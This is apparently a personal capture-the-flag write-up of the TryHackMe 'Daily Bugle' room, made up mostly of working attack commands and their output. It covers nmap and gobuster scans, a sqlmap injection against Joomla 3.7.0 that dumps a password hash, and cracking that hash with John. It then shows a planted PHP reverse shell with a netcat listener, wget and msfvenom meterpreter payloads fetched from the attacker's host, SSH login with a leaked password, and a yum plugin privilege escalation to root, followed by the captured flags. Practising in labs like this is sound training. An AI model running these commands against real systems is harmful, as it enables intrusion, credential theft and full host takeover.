# Daily Bugle Notes
___

# My IP = 10.8.19.163

# Target IP = 10.10.97.242*
* Connection and machines can volatile so several IPs may for the target may change throughout the write-up due to machine restarts.
----
# NMAP Scan

> nmap -Pn -n -sC -sV -vv -T5 -A 10.10.97.242 | tee dailybugle.nmap

> cat dailybugle.nmap | grep 'open'

	Results: 

	22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
	80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
	3306/tcp open  mysql   syn-ack MariaDB (unauthorized)

----

___
# GoBuster

Results:

>/images (Status: 301)
>/templates (Status: 301)
>/media (Status: 301)
>/modules (Status: 301)
>/bin (Status: 301)
>/plugins (Status: 301)
>/includes (Status: 301)
>/language (Status: 301)
>/components (Status: 301)
>/cache (Status: 301)
>/libraries (Status: 301)
>/tmp (Status: 301) - might be able to run something from here
>/layouts (Status: 301)
>/administrator (Status: 301) ***
>/cli ****
___

1. Trying administrator page.

	Admin login for a service called joomla.

	Note that says the website has Javascript enabled for administrator backend.

2. Trying cli.

	Blank white page. Maybe can be used to extract data later on.

# SQLMAP

1. Discovered README.txt. A readme file for joomla administration. 

> Joomla version 3.7.0.

Searched for exploit. Open to SQL Injection. Exploit-db URL:

> sqlmap -u "http://10.10.140.23/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --dump -D joomla -T "#__users"

2. Ran SQLMAP command. Results:

Discovered several tables in DB "joomla".

Reran command with "--dump -D joomla -T "#__users"". Performed column tests on "#__users" table. 

	Results:

	+------+---------------------+------------+---------+----------+--------------------------------------------------------------+
	| id   | email               | name       | params  | username | password                                                     |
	+------+---------------------+------------+---------+----------+--------------------------------------------------------------+
	| 811  | jonah@tryhackme.com | Super User | <blank> | jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
	+------+---------------------+------------+---------+----------+--------------------------------------------------------------+

# John The Ripper

> john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt pass.txt 

> Password : spiderman123

# Reverse Shell

1. Googled a way to get the template editor on the daily bugle Joomla admin page. Edited the "jsstring.php" then selected template preview after creating a Netcat session.

> http://10.10.81.253/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA

> nc -lnvp 6666

Added pentest monkeys PHP rev shell code to the js strings code after removing the original PHP code. 

> template preview.

SHELL CREATED!

Looking for flags and maybe an ssh key.

Creating a "simple http server to have the target download linpeas"

>  python -m SimpleHTTPServer 8000

Moved Linpeas into my  daily bugle folder.

> wget http://10.8.19.163:8000/linpeas.sh

Discovered a public password in php file from linpeas.

# SSH

Connected to SSH session as user "jjameson"

> ssh -l jjameson 10.10.81.253		Password: nv5uz9r3ZEDzVjNu

Success!

> whoami -

> cd /jjameson/Desktop

> cat user.txt - 27a260fe3cba712cfdedb1c86d80442e

# Privilege Escalation

1. Gain meterpreter shell.

	1. cd to /tmp and wget a meterpreter shell.

	> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.19.163 LPORT=11200 -f elf > shell.elf

	> wget http://10.8.19.163:8000/shell.elf
		
		> chmod +x shell.elf

	> Metasploit multi handler for shell.

		> Set options and run.

SUCCESS!!!!!!

# Meterpreter

> getuid - unknown commands

1. Try a priv escalation helper in MS.

> run post/multi/recon/local_exploit_suggester

No luck.

# Back to SSH Shell

1. Went to temp and discovered php files that run as root. Maybe I can create a root level shell and replace one of the files?

> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.19.163 LPORT=11200 -f php > deletefiles.php

> permission denied on the wget.

# GTFO Bins YUM for privilege escalation

>[jjameson@dailybugle tmp]$ TF=$(mktemp -d)
>[jjameson@dailybugle tmp]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
>[jjameson@dailybugle tmp]$ 
>[jjameson@dailybugle tmp]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
>[jjameson@dailybugle tmp]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
>[jjameson@dailybugle tmp]$ 
>[jjameson@dailybugle tmp]$ sudo yum -c $TF/x --enableplugin=y
>Loaded plugins: y
>No plugin match for: y
>sh-4.2# whoami
>root
>sh-4.2# pwd
>/tmp
>sh-4.2# cd /root
>sh-4.2# ls
>anaconda-ks.cfg  root.txt
>sh-4.2# cat root.txt
>eec3d53292b1821868266858d7fa6f79

# Finished!

	

